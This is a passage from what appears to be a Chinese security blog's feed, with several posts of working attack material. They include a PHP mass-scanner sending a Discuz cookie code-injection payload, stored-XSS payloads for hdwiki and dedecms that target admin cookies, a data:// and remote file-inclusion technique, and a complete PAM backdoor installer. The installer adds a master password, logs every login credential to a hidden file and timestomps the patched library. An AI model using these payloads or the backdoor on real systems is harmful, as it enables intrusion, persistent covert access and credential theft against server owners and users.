class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$rc-&gt;__set(<span class="string">'time_out'</span>, $timeout); <span class="comment">//设置超时时间</span></span><br><span class="line"></span><br><span class="line">$urls=file(<span class="string">'dz.txt'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($urls <span class="keyword">as</span> $url) &#123;</span><br><span class="line"><span class="comment">//$url=trim($url);</span></span><br><span class="line">$request = <span class="keyword">new</span> RollingCurlRequest(trim($url));</span><br><span class="line">$request-&gt;options = <span class="keyword">array</span>(CURLOPT_HTTPHEADER =&gt; <span class="keyword">array</span>(<span class="string">'Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'</span>));</span><br><span class="line"></span><br><span class="line">$rc-&gt;add($request);</span><br><span class="line">&#125;</span><br><span class="line">$rc-&gt;execute();</span><br><span class="line"><span class="comment">//时间统计函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_time</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">list</span>($microsec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line"><span class="keyword">return</span> $microsec + $sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'\r\n'</span>.<span class="string">'time: '</span> . round((func_time() – $start_time), <span class="number">4</span>) . <span class="string">'sec '</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> php代码控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php Thread实例</title>
      <link href="/2014/08/06/php-Thread/"/>
      <url>/2014/08/06/php-Thread/</url>
      
        <content type="html"><![CDATA[<blockquote><p>支持windows linux</p></blockquote><p><a href="http://php.net/manual/en/pthreads.installation.php" target="_blank" rel="noopener">安装配置参考</a><br><a href="http://docs.php.net/manual/zh/class.thread.php" target="_blank" rel="noopener">参考1</a><br><a href="https://github.com/krakjoe/pthreads/tree/master/examples" target="_blank" rel="noopener">代码示例1</a><br><a href="http://netkiller.github.io/journal/thread.php.html" target="_blank" rel="noopener">代码示例2</a></p><p>拿个 批量url转 ip 做例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_thread_run</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $url;</span><br><span class="line"><span class="keyword">public</span> $data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(($url = <span class="keyword">$this</span>-&gt;url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = gethostbyname($url);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">model_thread_result_get</span><span class="params">($urls_array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> ($urls_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">$thread_array[$key] = <span class="keyword">new</span> test_thread_run($value);</span><br><span class="line">$thread_array[$key]-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($thread_array <span class="keyword">as</span> $thread_array_key =&gt; $thread_array_value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>($thread_array[$thread_array_key]-&gt;isRunning())</span><br><span class="line">&#123;</span><br><span class="line">usleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($thread_array[$thread_array_key]-&gt;join())</span><br><span class="line">&#123;</span><br><span class="line">$variable_data[$thread_array_key] = $thread_array[$thread_array_key]-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $variable_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$urls=file(<span class="string">'hosts.txt'</span>);</span><br><span class="line"><span class="comment">//$print_r($urls);</span></span><br><span class="line">$c= count($urls);</span><br><span class="line"><span class="comment">//$h[]=array(");</span></span><br><span class="line"><span class="keyword">foreach</span> ($urls <span class="keyword">as</span> $u)&#123;</span><br><span class="line">$urls_array[]=trim($u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r($urls_array);</span></span><br><span class="line">$t = microtime(<span class="keyword">true</span>);</span><br><span class="line">$result = model_thread_result_get($urls_array);</span><br><span class="line"><span class="comment">//print_r($result);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"将$c 条url转换为 ip\n"</span>;</span><br><span class="line">$e = microtime(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"多线程耗时："</span>.($e-$t).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$t = microtime(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($urls_array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">gethostbyname($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$e = microtime(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"单线程耗时："</span>.($e-$t).<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> php代码控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hdwiki 一些存储型xss</title>
      <link href="/2014/02/27/hdwiki-xss/"/>
      <url>/2014/02/27/hdwiki-xss/</url>
      
        <content type="html"><![CDATA[<p>官方下载最新版本</p><h5 id="1-hdwiki-礼品商店存储型漏洞"><a href="#1-hdwiki-礼品商店存储型漏洞" class="headerlink" title="1. hdwiki 礼品商店存储型漏洞"></a>1. hdwiki 礼品商店存储型漏洞</h5><p>无任何过滤，后台模块-&gt; 礼品商店 -&gt; 礼品兑换日志<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/9558de8ec69ff1ae00cde24d346e20ea.png" alt="2019-07-19-04-06-57"></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/67bc09d4da7cae27a27f4e2f239a4cb3.png" alt="2019-07-19-04-07-10"></p><h4 id="2-创建或编辑词条-存储型xss"><a href="#2-创建或编辑词条-存储型xss" class="headerlink" title="2. 创建或编辑词条 存储型xss"></a>2. 创建或编辑词条 存储型xss</h4><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/64fbe1434874fd56a597100579540818.png" alt="2019-07-19-04-07-41"><br>exp :<br>过狗<br><code>&lt;marquee onstart=&#39;javascript:document.write(String.fromCharCode(60, 115, 99, 114, 105, 112,此处省略))&#39;&gt;&lt;/marquee&gt;</code></p><p><strong>hdwiki</strong> 管理<strong>cookie</strong> 是无法直接 进入后台 以及执行其它后台操作<br><strong>session</strong> 表中 <strong>islogin=2</strong>  才可以进后台</p><p>配合最近一个鸡肋 <strong>Referer</strong>注入（相关文章：<a href="http://hi.baidu.com/h4ckey/item/8bc0c30dbceb6ec2905718af" target="_blank" rel="noopener">http://hi.baidu.com/h4ckey/item/8bc0c30dbceb6ec2905718af</a> ）:<br>admin_’,islogin=2 #  //by @BinAry<br>访问过后台 islogin=2 才可以进行后台操作 (ajax 添加用户)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dedecms 空间存储型xss分析</title>
      <link href="/2014/02/27/dedecms-space/"/>
      <url>/2014/02/27/dedecms-space/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($fmdo==<span class="string">'moodmsg'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//用户登录</span></span><br><span class="line">    <span class="keyword">if</span>($dopost==<span class="string">"sendmsg"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($content))</span><br><span class="line">        &#123;</span><br><span class="line">        $ip = GetIP();</span><br><span class="line">        $dtime = time();</span><br><span class="line">          $ischeck = ($cfg_mb_msgischeck == <span class="string">'Y'</span>)? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span>($cfg_soft_lang == <span class="string">'gb2312'</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              $content = utf82gb(nl2br($content));</span><br><span class="line">          &#125; </span><br><span class="line">          $content = cn_substrR(HtmlReplace($content,<span class="number">1</span>),<span class="number">360</span>);  <span class="comment">//对内容进行处理 -&gt; 看看 HtmlReplace函数</span></span><br><span class="line">          <span class="comment">//对表情进行解析</span></span><br><span class="line">          $content = addslashes(preg_replace(<span class="string">"/\[face:(\d&#123;1,2&#125;)\]/is"</span>,<span class="string">"&lt;img src='"</span>.$cfg_memberurl.<span class="string">"/templets/images/smiley/\\1.gif' style='cursor: pointer; position: relative;'&gt;"</span>,$content));</span><br><span class="line">          省略...</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HtmlReplace</span><span class="params">($str,$rptype=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $str = stripslashes($str); <span class="comment">//函数删除由 addslashes() 函数添加的反斜杠</span></span><br><span class="line">                $str = preg_replace(<span class="string">"/&lt;[\/]&#123;0,1&#125;style([^&gt;]*)&gt;(.*)&lt;\/style&gt;/i"</span>, <span class="string">''</span>, $str);<span class="comment">//2011-06-30 禁止会员投稿添加css样式 (by:织梦的鱼)</span></span><br><span class="line">        <span class="keyword">if</span>($rptype==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $str = htmlspecialchars($str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($rptype==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $str = htmlspecialchars($str); <span class="comment">//预定义的字符转换为 HTML 实体</span></span><br><span class="line">            $str = str_replace(<span class="string">"　"</span>, <span class="string">' '</span>, $str);</span><br><span class="line">            $str = preg_replace(<span class="string">"/[\r\n\t ]&#123;1,&#125;/"</span>, <span class="string">' '</span>, $str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($rptype==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $str = htmlspecialchars($str);</span><br><span class="line">            $str = str_replace(<span class="string">"　"</span>, <span class="string">''</span>, $str);</span><br><span class="line">            $str = preg_replace(<span class="string">"/[\r\n\t ]/"</span>, <span class="string">''</span>, $str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $str = preg_replace(<span class="string">"/[\r\n\t ]&#123;1,&#125;/"</span>, <span class="string">' '</span>, $str);</span><br><span class="line">            $str = preg_replace(<span class="string">'/script/i'</span>, <span class="string">'ｓｃｒｉｐｔ'</span>, $str);</span><br><span class="line">            $str = preg_replace(<span class="string">"/&lt;[\/]&#123;0,1&#125;(link|meta|ifr|fra)[^&gt;]*&gt;/i"</span>, <span class="string">''</span>, $str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> addslashes($str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>HtmlReplace</code> 函数  <code>$rptype</code> 传递过来的是1预定义的字符转换为 HTML 实体</p><p>因此插入到数据库的数据 是经过转换 成 html实体的 从而过滤特殊字符</p><p>经过函数跟踪发现显示会员心情管理  </p><p><code>&lt;?php echo jstrimjajxlog($fields[&#39;msg&#39;],200); ?&gt;</code></p><p>调用了  <code>jstrimjajxlog</code>函数 （将<strong>html</strong>实体 又还原了 0rz…）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">JstrimJajxLog</span><span class="params">($str,$len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $str = cn_substr($str,$len);</span><br><span class="line">    $str = str_replace(<span class="string">''</span><span class="string">', '</span><span class="string">"', $str);</span></span><br><span class="line"><span class="string">    $str = str_replace('&amp;lt;', '&lt;', $str);</span></span><br><span class="line"><span class="string">    $str = str_replace('&amp;gt;', '&gt;', $str);</span></span><br><span class="line"><span class="string">    return $str;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/dad0bb832a4820c27e17b4cfb79429cd.png" alt="2019-07-22-05-16-33"></p><p>一般管理员不会去看这个的</p><ul><li>注意不要用 引号 因为有 stripslashes 转义<br>测试语句:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg</span>==&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>开启GPC情况下本地包含</title>
      <link href="/2013/11/19/php-GPC-bypass/"/>
      <url>/2013/11/19/php-GPC-bypass/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章于 2013-11-19 发表于<strong>t00ls</strong><br><a href="https://www.t00ls.net/thread-24941-1-1.html" target="_blank" rel="noopener">开启GPC情况下本地包含</a></p></blockquote><p>漏洞代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$langx=$_REQUEST[<span class="string">'langx'</span>];</span><br><span class="line"><span class="keyword">include</span> ($langx.<span class="string">".inc.php"</span>);</span><br></pre></td></tr></table></figure><p>环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc        On</span><br><span class="line">allow_url_fopen        On</span><br><span class="line">allow_url_include        On</span><br><span class="line"></span><br><span class="line">PHP Version 5.3.3-7</span><br><span class="line">Apache 2.0</span><br><span class="line">Linux debian 2.6.32-5-amd64</span><br></pre></td></tr></table></figure><p><code>GPC</code> 为<code>on</code><br><code>%00</code> 截断？  超长 <code>././</code><br>都不行</p><p>post 或get方式提交<br><code>langx=data://text/plain,&lt;?php phpinfo();?&gt;</code></p><p>相当于 包含了一个内容为 <code>&lt;?php phpinfo();?&gt;.inc.php</code>的文件</p><p>所以不用考虑截断<br>成功执行!</p><p>测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen        Off  </span><br><span class="line">allow_url_include        On</span><br></pre></td></tr></table></figure><p><strong>包含失败</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen        On    </span><br><span class="line">allow_url_include        Off</span><br></pre></td></tr></table></figure><p><strong>包含失败</strong></p><p>依赖条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen        On</span><br><span class="line">allow_url_include        On</span><br><span class="line">PHP 5.2.0 以上</span><br></pre></td></tr></table></figure><blockquote><p>利用场景：php 版本过高(大于php5.3.4 NULL截断失效)或开启GPC 导致截取失效, 但恰好服务器 php.ini allow_url_fopen、allow_url_include 都配置为on<br>不过 很少有服务器同时 开启这两个</p></blockquote><p>更多方式期待大家测试与交流</p><p>补充：</p><p>远程放一个 <code>xx.inc.php</code><br>利用：<code>http://target_site/include.php?xx=http://xxoo.com/xx</code><br>利用场景更宽</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql 数据dump脚本</title>
      <link href="/2013/09/13/mysql-bigdata-dump/"/>
      <url>/2013/09/13/mysql-bigdata-dump/</url>
      
        <content type="html"><![CDATA[<p>平時有權限訪問數據庫目錄的話 直接下載該數據庫目錄<br>有權限執行命令的話 通過<strong>mysqldump</strong>或者<strong>into outfile</strong>也是相當不錯的<br><strong>phpmyadmin</strong> 作爲專業的數據庫管理工具備份數據庫的話非常不錯 </p><p>根據帝國備份以及<strong>Navicat</strong>寫了個簡單的脫庫腳本<br>優點:</p><ol><li><p>即使執行超時了 或者關閉了瀏覽器 腳本仍然會執行</p></li><li><p>可以自己構造 字段 進行脫庫（帝國備份是沒有這樣的功能的）</p></li><li><p>和帝國備份王 以及 <strong>Navicat</strong>一樣的 將查詢結果保存在服務器（<strong>Navicat</strong> 不是以這樣的方式） 查詢完畢 自動打包</p></li></ol><p>代码片段：<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/57784c9ea0b47f91f98bba5e33e309ac.png" alt="2019-07-19-03-58-31"></p><p>缺點：<br>本代碼自己臨時寫的 十分簡陋 不返回任何信息 僅能實現 最基本的需求 使用者需有一定的php代碼功底 （比如說 定義數據庫 、定義查詢語句、定義字段、定義編碼） </p><p>歡迎修改（優化）成更好更通用的 數據庫備份腳本</p><p>題外話：某次测试在內網其它機器上的數據庫需要備份（不是脫庫）出來、數據庫又不允許外網連接、無法獲取shell、 速度佢慢 數據量龐大 。用navicat 幾次均卡死<br>用帝國備份不能指定字段（或者有我沒發現） 所以只能自己折騰一個了</p><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/mysql-dump-by-lostwolf.zip" target="_blank" rel="noopener">mysqldump</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pam后门 自动安装脚本</title>
      <link href="/2013/09/02/pam-backdoor/"/>
      <url>/2013/09/02/pam-backdoor/</url>
      
        <content type="html"><![CDATA[<blockquote><p>该脚本来源：<a href="https://github.com/m00dy/pam-backdoor/blob/master/pam-backdoor" target="_blank" rel="noopener">https://github.com/m00dy/pam-backdoor/blob/master/pam-backdoor</a></p></blockquote><p>博主对其第二次修改<br>由 <strong>litdgs</strong> 改写成自动安装并作相关优化</p><blockquote><p>链接：<a href="https://www.t00ls.net/viewthread.php?tid=24062" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=24062</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">## </span></span><br><span class="line"><span class="comment">##查看版本:</span></span><br><span class="line"><span class="comment">##redhat yum list pam</span></span><br><span class="line"><span class="comment">##debian&amp;Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">PASS=<span class="string">'test123'</span> <span class="comment">##......</span></span><br><span class="line">LOG=<span class="string">'\/bin\/.sshlog'</span> <span class="comment">##......</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">.___  ___.   ___     ___    _______  ____    ____ </span></span><br><span class="line"><span class="string">|   \/   |  / _ \   / _ \  |       \ \   \  /   / </span></span><br><span class="line"><span class="string">|  \  /  | | | | | | | | | |  .--.  | \   \/   /  </span></span><br><span class="line"><span class="string">|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   </span></span><br><span class="line"><span class="string">|  |  |  | | |_| | | |_| | |  '--'  |    |  |     </span></span><br><span class="line"><span class="string">|__|  |__|  \___/   \___/  |_______/     |__|   "</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nPam-Backdoor\n&#123;code this shit while learning pam&#125;\n\n"</span></span><br><span class="line">oldtime=`<span class="built_in">stat</span> -c <span class="string">'%z'</span> /lib/security/pam_ftp.so`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Pam backdoor starting!'</span></span><br><span class="line">mirror_url=<span class="string">'http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz'</span></span><br><span class="line"><span class="comment">#mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Fetching from '</span><span class="variable">$mirror_url</span></span><br><span class="line">wget <span class="variable">$mirror_url</span> <span class="comment">#fetch the roll</span></span><br><span class="line">tar zxf Linux-PAM-1.1.1.tar.gz <span class="comment">#untar</span></span><br><span class="line"><span class="built_in">cd</span> Linux-PAM-1.1.1</span><br><span class="line"><span class="comment">#find and replace</span></span><br><span class="line">sed -i -e <span class="string">'s/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,"'</span><span class="variable">$PASS</span><span class="string">'")==0 )&#123;retval = PAM_SUCCESS;&#125;if(retval == PAM_SUCCESS)&#123;\n\tFILE * fp;\n\tfp = fopen("'</span><span class="variable">$LOG</span><span class="string">'", "a");\n\tfprintf(fp, "%s : %s\\n", name, p);\n\tfclose(fp);\n\t&#125;/g'</span> modules/pam_unix/pam_unix_auth.c</span><br><span class="line">DIS=`head /etc/issue -n 1|awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"><span class="comment">#get the version</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DIS</span> = <span class="string">"CentOS"</span> ];<span class="keyword">then</span></span><br><span class="line">./configure --<span class="built_in">disable</span>-selinux &amp;&amp; make</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">./configure &amp;&amp; make</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#copy modified pam_unix.so</span></span><br><span class="line"><span class="keyword">if</span> [ `uname -p` = <span class="string">'x86_64'</span> ];<span class="keyword">then</span></span><br><span class="line">LIBPATH=lib64</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">LIBPATH=lib</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">/bin/cp -rf /<span class="variable">$LIBPATH</span>/security/pam_unix.so /<span class="variable">$LIBPATH</span>/security/pam_unix.so.bak <span class="comment">#.. .........</span></span><br><span class="line">/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /<span class="variable">$LIBPATH</span>/security/pam_unix.so</span><br><span class="line">touch -d <span class="string">"<span class="variable">$oldtime</span>"</span> /lib/security/pam_unix.so</span><br><span class="line"><span class="built_in">cd</span> .. &amp;&amp; rm -rf Linux-PAM-1.1.1*</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Done bro.."</span></span><br></pre></td></tr></table></figure><p>如报一下错误 请安装<br><strong>flex-devel</strong></p><p>linux 发行版本太多了 不可能所有版本linux进行测试<br>如有bug 欢迎优化 修正…</p>]]></content>
      
      
      
        <tags>
            
            <tag> backdoor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yunfile网盘多线程破解</title>
      <link href="/2013/08/20/yunfile/"/>
      <url>/2013/08/20/yunfile/</url>
      
        <content type="html"><![CDATA[<p>文章2013-8-20 13:42 发于<a href="https://www.t00ls.net/thread-23935-1-1.html" target="_blank" rel="noopener">t00ls</a><br>引用<a href="https://github.com/chuyskywalker/rolling-curl" target="_blank" rel="noopener">rolling-curl</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 